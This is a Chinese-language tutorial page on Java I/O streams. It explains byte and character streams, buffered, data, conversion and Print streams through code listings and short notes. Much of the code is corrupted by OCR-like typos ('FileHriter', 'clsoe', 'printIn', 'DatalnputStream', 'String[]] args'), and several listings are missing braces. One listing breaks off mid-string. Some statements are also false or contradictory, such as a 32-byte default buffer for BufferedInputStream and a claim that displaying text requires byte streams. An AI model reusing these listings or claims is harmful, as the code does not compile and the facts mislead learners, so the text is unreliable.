<span class="title">write</span><span class="params">(String string)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符串从offset开始的1ength个字符写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(String string, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//关闭流释放内存资源</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//将输出流中缓冲的数据全部写出到目的地</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestI0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">&quot;D:/share/S5/1.php&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> ch;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ch = fr.read();</span><br><span class="line">        <span class="keyword">while</span> (-<span class="number">1</span> !=ch)</span><br><span class="line">        &#123;</span><br><span class="line">++cnt;</span><br><span class="line">System.out.printf(<span class="string">&quot;%c&quot;</span>, (<span class="keyword">char</span>)ch);</span><br><span class="line">            ch = fr.read();</span><br><span class="line">&#125;</span><br><span class="line">System.out.printf(<span class="string">&quot;该文件字符的个数是:%d\n&quot;</span>, cnt);</span><br><span class="line">        fr.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fr返回的是一个字符的编码对应的数字</p><p>输出文本使用字符流：</p><p>1.不会乱码</p><p>2.速度快</p><p><strong>字符流只能处理文本信息，字节流可以处理任何信息</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFileReaderHriterCopy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">&quot;D:\1.php&quot;</span>);</span><br><span class="line">        Filewriter fw = <span class="keyword">new</span> Filewriter(<span class="string">&quot;d:/zhangsan. haha&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> ch;</span><br><span class="line">        </span><br><span class="line">ch = fr.read();</span><br><span class="line">        <span class="keyword">while</span> (-<span class="number">1</span> != ch)</span><br><span class="line">        &#123;</span><br><span class="line">fw.write(ch);</span><br><span class="line">            ch = fr.read();</span><br><span class="line">&#125;</span><br><span class="line">fw.flush();</span><br><span class="line">        fr.clsoe();</span><br><span class="line">        fw.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果不刷新缓存器，内容可能写不进去，写完要刷新，有时候需要flush，有时候不需要，为了保证都先 flush() 再关闭，就不会出错</p><p><strong>文本文件复制拷贝可以使用字节流，但读取显示要字节流</strong></p><p> read() 返回的是原始文件二进制代码对应的字符</p><p>​    字符流不能处理非文本文件，文件本来不是一个字符，当成字符就会出错，存在编码解码问题</p><h2 id="字节流与字符流区别"><a href="#字节流与字符流区别" class="headerlink" title="字节流与字符流区别"></a>字节流与字符流区别</h2><ul><li><strong><code>FilelnputStream</code> 和 <code>FileOutputStream</code> 可以完成所有格式文件的赋值</strong></li><li><strong><code>FileReader</code> 和 <code>FileWriter</code> 只可以完成文本文件的复制，却无法完成视频格式文件的复制</strong></li><li>因为字节是不需要解码和编码的，将字节转化为字符才存在解码和解码的问题</li><li>字节流可以从所有格式的设备中读写数据，但字符流只能从文本格式的设备中读写数据</li></ul><h1 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h1><p>文件流包括<br>    <code>FilelnputStream Fileoutputstream</code>     —-字节流<br>    <code>FileReader FileWriter</code>                            —-字符流</p><h2 id="FilelnputStream的使用"><a href="#FilelnputStream的使用" class="headerlink" title="FilelnputStream的使用"></a>FilelnputStream的使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lnputStream   是用来读取字节的，是个抽象类，我们通常使用的是该类的子类</span><br><span class="line">    </span><br><span class="line">FilelnputStream 是 InputStream的子类，利用 FilelnputStream 可以将一个文件的内容按字节为单位读取出来</span><br><span class="line">    </span><br><span class="line">FilelnputStream 有一个很常用的构造函数</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FilelnputStream</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function">    利用该构造函数可以实现将输入流连接到某个文件的功能</span></span><br><span class="line"><span class="function">必须对本构造函数抛出的异常进行捕捉</span></span><br><span class="line"><span class="function">如果用字符串来表示操作系统的文件路径时，我们可以使用\\ 和 /两种方式来作为文件夹的路径分隔符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">FileOutputStream 同理,不再赘述</span></span><br></pre></td></tr></table></figure><h2 id="FileReader的使用"><a href="#FileReader的使用" class="headerlink" title="FileReader的使用"></a>FileReader的使用</h2><ul><li>Reader 是用来读取字符的，是个抽象类，我们通常使用的是该类的子类</li><li>FileReader 是 Reader 的子类，利用 FileReader 可以将一个文件的内容以字符为单位读取出来</li><li>FileReader有一个很常用的构造函数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileReader</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function">    利用该构造函数可以实现将输入流连接到某个文件的功能</span></span><br><span class="line"><span class="function">必须对本构造函数抛出的异常进行捕捉</span></span><br><span class="line"><span class="function">如果用字符串来表示操作系统的文件路径时，我们可以使用 \\ 和 / 两种方式来作为文件夹的路径分隔符</span></span><br></pre></td></tr></table></figure><ul><li>FileWriter 同理,不再赘述</li></ul><h1 id="缓存流"><a href="#缓存流" class="headerlink" title="缓存流"></a>缓存流</h1><ul><li>缓冲流就是带有缓冲区的输入输出流</li><li>缓冲流可以显著的减少我们对IO访问的次数，保护我们的硬盘</li><li>缓冲流本身就是处理流(处理流也叫包裹流)，缓冲流必须得依附于节点流{节点流也叫原始流)</li><li>处理流是包裹在原始节点流上的流,相当于包括在管道上的管道</li></ul><p>​    缓冲流要”套接”在相应的节点流之上，对读写的数据提供了缓冲的功能，提高了读写的效率，同时增加了一些新的方法。<br>  J2SDK提供了四种缓存流，其常用的构造方法为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader(Reader in)</span><br><span class="line">BufferedReader(Reader in,<span class="keyword">int</span> sz) <span class="comment">//sz为自定义缓存区的大小</span></span><br><span class="line">Bufferedwriter(writer out)</span><br><span class="line">Bufferedwriter(writer out ,<span class="keyword">int</span> sz)</span><br><span class="line">BufferedInputstream(I nputstream in)</span><br><span class="line">BufferedInputstream(Inputstream in,<span class="keyword">int</span> size)</span><br><span class="line">Bufferedoutputstream(outputstream out)</span><br><span class="line">Bufferedoutputstream(outputstream out ,<span class="keyword">int</span> size)</span><br></pre></td></tr></table></figure><ul><li>缓冲输入流支持其父类的 mark 和 reset 方法。（mark是标记）</li><li>BufferedReader 提供了 readLine 方法用于读取一行字符串(以\r或\n分隔）。</li><li>Bufferedwriter提供了newLine用于写入一个行分隔符。</li><li>对于输出的缓冲流，写出的数据会先在内存中缓存，使用f1ush方法将会使内存中的数据立刻写出。</li></ul><h2 id="BufferedOutputStream-和-BufferedInputStream"><a href="#BufferedOutputStream-和-BufferedInputStream" class="headerlink" title="BufferedOutputStream 和 BufferedInputStream"></a>BufferedOutputStream 和 BufferedInputStream</h2><ul><li>BufferedOutputStream：带缓冲的输出流，允许一次向硬盘写入多个字节的数据</li><li>BufferedInputStream：带缓冲的输入流，允许一次向程序中读入多个字节的数据</li><li>BufferedOutputStream 和 BufferedlnputStream 都是包裹流,必须的依附于OutputStream和InputStream</li><li>例子:<ul><li>利用BufferedOutputStream和 BufferedInputStream完成大容量文件的复制，这远比单纯利用FilelnputStream 和 FileOutputStream要快得多</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(</span><br><span class="line"><span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\综艺\\电影\\猫和老鼠CD4.rmvb&quot;</span>)</span><br><span class="line">);  <span class="comment">//bis输入流有个默认的缓冲区，大小为32个字节</span></span><br><span class="line"><span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> len = bis.read(buf, <span class="number">0</span>, <span class="number">1024</span>);</span><br></pre></td></tr></table></figure><p>​    <strong>要注意，bis.read(buf, 0, 1024); 这不是从buf中读数据，而是从bis所关联到的“D:\综艺\电影\猫和老鼠CD4.rmvb”文件中读取数据，并将读取的数据写入bis自己的默认缓冲区中，然后再将缓冲区的内容写入buf数组中，每次最多向buf数组中写入1024个字节，返回实际写入buf数组的字节个数，如果读到了文件的末尾，无法再向buf数组中写入数据,则返回-1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream流中有</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(bytel b)</span></span></span><br><span class="line"><span class="function">用来把从当前流关联到的设备中读取出来的数据存入一个<span class="keyword">byte</span>数组中</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">BufferedOutputStream流中有</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span> b)</span></span></span><br><span class="line"><span class="function">用来把<span class="keyword">byte</span>数组中的数据输出到当前流所关联到的设备中</span></span><br></pre></td></tr></table></figure><p>如果我们希望用 BufferedInputStream 和 BufferedOutputStream 完成“将一个设备中的数据导入另一个设备中”，我们就应该定义一个临时的byte类型的数组，用这个临时数组作为输入流与输出流进行交互的中转枢纽</p><p>​    <strong>输入流 BufferedInputStream  和输出流BufferedOutputStream是如何产生关联的，靠什么连接一起，靠 buf，先把输入的数据放进 buf，输出流从 buf 读出数据，输出到输出流所连接的设备中</strong></p><p>​    BufferedInputstream BufferedoutputStream 要比 FilelnputStream File OutputStream读写数据的速度快</p><p><strong>我们只有</strong></p><ul><li>BufferedInputStream</li><li>BufferedOutputStream类</li><li>BufferedWriter</li><li>BufferedReader</li></ul><h2 id="BufferedReader-和-BufferedWriter"><a href="#BufferedReader-和-BufferedWriter" class="headerlink" title="BufferedReader 和 BufferedWriter"></a>BufferedReader 和 BufferedWriter</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line"><span class="keyword">new</span> FileReader(<span class="string">&quot;c:\\1.php&quot;</span>)</span><br><span class="line">    );</span><br><span class="line">bw = <span class="keyword">new</span> BufferedWriter(</span><br><span class="line"><span class="keyword">new</span> FileHriter(<span class="string">&quot;d:/share/Hriter.txt&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">String str = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">null</span> != (str=br.readLine()))  <span class="comment">//br.readLine() 读取一行字符但不包括换行符，一个个读发现有换行符就把前面的字符返回，并自动丢弃换行符</span></span><br><span class="line">&#123;</span><br><span class="line">    bw.write(str);</span><br><span class="line">bw.newLine();  <span class="comment">//写入一个换行符这行不能省</span></span><br><span class="line">&#125;</span><br><span class="line">bw.flush() ;</span><br></pre></td></tr></table></figure><h1 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h1><h2 id="DatalnputStream"><a href="#DatalnputStream" class="headerlink" title="DatalnputStream"></a>DatalnputStream</h2><p>​    DatalnputStream能够以一种与机器无关的方式，直接从底层字节输入流读取Java基本类型和Sring类型的数据，常用方法包括</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DatalnputStream</span><span class="params">(InputStream in)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">readBoolean</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> <span class="title">readByte</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">double</span> <span class="title">readDouble</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">float</span> <span class="title">readFloat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">readInt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">readLong</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">short</span> <span class="title">readShort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">readUTF</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>DatalnputStream是包裹流,必须依附于InputStream</p><h2 id="DataOutputStream"><a href="#DataOutputStream" class="headerlink" title="DataOutputStream"></a>DataOutputStream</h2><p>​    DataOutputStream能够以一种与机器无关的方式,直接将Java基本类型和String类型数据写出到其他的字节输出流。常见方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DataOutputStream</span><span class="params">(OutputStream in)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">writeBoolean</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> <span class="title">writeByte</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">writeChar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">double</span> <span class="title">writeDouble</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">float</span> <span class="title">writeFloat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">writelnt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">writeLong</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">short</span> <span class="title">writeShort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">writeUTF</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>DataOutputStream是包裹流，必须依附于OutputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestData</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">    <span class="keyword">long</span> m = <span class="number">1234567</span>;</span><br><span class="line">    dos.writeLong(m)；</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">byte</span>[] buf2 = baos.toByteArray();</span><br><span class="line">        </span><br><span class="line">    ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(buf2);</span><br><span class="line">        DatalnputStream dis = <span class="keyword">new</span> DatalnputStream (buf2);</span><br><span class="line">    <span class="keyword">long</span> n;</span><br><span class="line">    n = dis.readLong();</span><br><span class="line">    <span class="comment">//dis.readLong(a); //error</span></span><br><span class="line">        </span><br><span class="line">    System.out.println(<span class="string">&quot;n = &quot;</span> + n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h1><ul><li>OutputStreamWriter 流是把OutputStream流转化成Writer流的流</li><li>InputStreamReader是把InputStream转化成ReaderOutputStreamWriter 和 </li><li>InputStreamReader都是包裹流</li><li>编程:<br>如何将键盘输入的字符组成字符串直接赋给String对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestString</span></span></span><br><span class="line">public static void main(String[]] args)</span><br><span class="line">&#123;</span><br><span class="line">    String str = <span class="keyword">null</span> ;</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line">    str = br.readLine();</span><br><span class="line">System.out.println(<span class="string">&quot;str = &quot;</span> + str) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="readLine-与回车符的问题"><a href="#readLine-与回车符的问题" class="headerlink" title="readLine()与回车符的问题"></a>readLine()与回车符的问题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">BufferedReader br =<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> lnputStreamReader(System.in));</span><br><span class="line">str = br.readLine();</span><br></pre></td></tr></table></figure><p>如果直接输入回车的话,则</p><ol><li>br.readLine()会丢弃回车符，而不是返回回车符，即br.readLine()遇到回车符时终止读取，并且会把读取到的回车符自动丢弃掉</li><li>br.readLine()返回的是“”而不是null，“”表示空字符串null表示空指针,空指针就是空地址，空地址就是不指向任何存储单元的意思</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBuffered</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(Stringargs)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">        System.out.printIn(<span class="string">&quot;str =&quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputstreamReader(System.in);                                              </span><br><span class="line">        str = br.readLine(); <span class="comment">//如果字节输入回车的话，str的值就会变成空字符串</span></span><br><span class="line">                                               </span><br><span class="line">        System.out.printIn(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">        System.out.println(str + <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.printIn(str.equals(<span class="string">&quot;&quot;</span>); <span class="comment">//true</span></span><br><span class="line">        System.out.printIn(str == <span class="keyword">null</span>); <span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Print流"><a href="#Print流" class="headerlink" title="Print流"></a>Print流</h1><ul><li>Print流只输出，不输入</li><li>分类<ul><li>PrintWriter输出字符</li><li>PrintStream 输出字节</li></ul></li></ul><h2 id="print流的由来"><a href="#print流的由来" class="headerlink" title="print流的由来"></a>print流的由来</h2><ul><li><p>Writer的write方法可以写入</p><ul><li>一个字符</li><li>一个字符数组</li><li>一个字符数组的一部分一个字符串</li><li>一个字符的一部分</li></ul></li><li><p>OutputStream的write方法可以写入</p><ul><li>一个字节</li><li>一个字节数组</li><li>一个字节数组的一部分</li></ul></li><li><p>DataOutputStream流可以写入</p><ul><li>一个字节</li><li>一个字节数组{继承自outputStream)</li><li>一个字节数组的一部分</li><li>所有的基本类型数据的二进制代码<pre><code>     如: writeDouble&#123;8.8); 写入的是8.8的二进制代码,共占8个字节</code></pre></li></ul></li><li><p>PrintStream流的print可以写入</p><ul><li>所有基本类型数据的字符串形式表示<pre><code> 如: print(8.8); 写入的是&#39;8∵8这三个字符,共占3个字节</code></pre></li></ul></li></ul><h2 id="PrintStream"><a href="#PrintStream" class="headerlink" title="PrintStream"></a>PrintStream</h2><ul><li>PrintStream在OutputStream基础之上提供了增强的功能，即可以方便地输出各种类型数据（而不仅限于byte型）的格式化表示形式。</li><li>PrintStream重载了print和println方法，用于各种不同类型数据的格式化输出</li><li>格式化输出是指将一个数据用其字符串格式输出</li><li>DataOutputStream中的writeXXX(data)方法是把data在内存中的二进制数据写入文件</li><li>PrintStream中的println(data)是该数据的格式化后的字符串写入文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DataOutput Stream 中的 writeXXX(data)方法</span></span><br><span class="line"><span class="comment">与</span></span><br><span class="line"><span class="comment">PrintStream 中的 println(dat a) 的区别</span></span><br><span class="line"><span class="comment">总结:</span></span><br><span class="line"><span class="comment">DataOut putStream 中的 writeXXX(data)方法是把data在内存中的</span></span><br><span class="line"><span class="comment">PrintStream 中的 println(data)写出的是该数据的格式化后的字</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPrintStream_1</span></span></span><br><span class="line">public static void main(String[] args) throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    DataOutputStream dos = <span class="keyword">new</span> <span class="function">DataOut <span class="title">putStream</span><span class="params">(new FileOutputStream(<span class="string">&quot;d:/share/kk.txt&quot;</span>)</span></span>;</span><br><span class="line">    dos.writeLong(<span class="number">12345</span>); <span class="comment">//实际写入文件的是00 00 00 00 00 00 30 39</span></span><br><span class="line"></span><br><span class="line">    dos.close();</span><br><span class="line">    System.out.printf(<span class="string">&quot;%#X\n&quot;</span>，<span class="number">12345</span>);</span><br><span class="line">    </span><br><span class="line">    PrintStream ps =.<span class="function">new <span class="title">PrintStream</span><span class="params">(new FileOut putStream(<span class="string">&quot;d:/</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">    ps.println(12345); //实际写入文件的是 ’1’ &#x27;2&#x27; &#x27;3’ &#x27;4&#x27; &#x27;5’</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">ps.close();</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">&#125;</span></span></span></span><br></pre></td></tr></table></figure><h2 id="PrintWriter"><a href="#PrintWriter" class="headerlink" title="PrintWriter"></a>PrintWriter</h2><ul><li>PrintWriter提供了PrintStream的所有打印方法，其方法也从不抛出IOException。</li><li>与PrintStream的区别:<ul><li>作为处理流使用时，PrintStream只能封装OutputStream类型的字节流，而PrintWriter既可以封装OutputStream,还能够封装Writer</li><li>PrintWriter中的printIn()方法具有更好的跨平台性</li></ul></li></ul><h2 id="标准输入输出的重定向"><a href="#标准输入输出的重定向" class="headerlink" title="标准输入输出的重定向"></a>标准输入输出的重定向</h2><p>例如：</p><ul><li>编程实现将键盘输入的数据输入A文件中，如果输入有误，则把出错信息输出到B文件中</li><li>预备知识</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span 